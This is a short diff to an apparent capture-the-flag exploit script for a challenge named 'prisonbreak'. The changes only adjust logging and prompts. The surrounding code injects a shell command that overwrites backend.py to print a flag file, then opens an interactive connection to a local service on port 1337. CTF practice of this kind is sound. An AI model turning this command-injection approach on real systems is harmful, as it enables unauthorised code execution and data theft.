@@ -38,7 +38,6 @@ def attack(command):
     config = '''
     b *0x1000002a
     '''
-    context.log_level = 'debug'
     #s = process("./prisonbreak")
     #gdb.attach(s, config)
     #s.send(payload)
@@ -65,12 +64,15 @@ def exploit_1():
 def exploit_2():
     attack('echo "print(open(\'lincoln_burrows\', \'r\').read())" > backend.py')
 
-    raw_input('[Enter to get flag]')
+    log.success('[Enter to get flag]')
+    raw_input()
     s = remote('127.0.0.1', 1337)
     s.interactive()
 
+#context.log_level = 'debug'
 exploit_1()
-raw_input('[End 1st step. Enter and wait a minute]')
+log.success('[End 1st step. Enter and wait a minute]')
+raw_input()
 time.sleep(60)
 exploit_2()
 
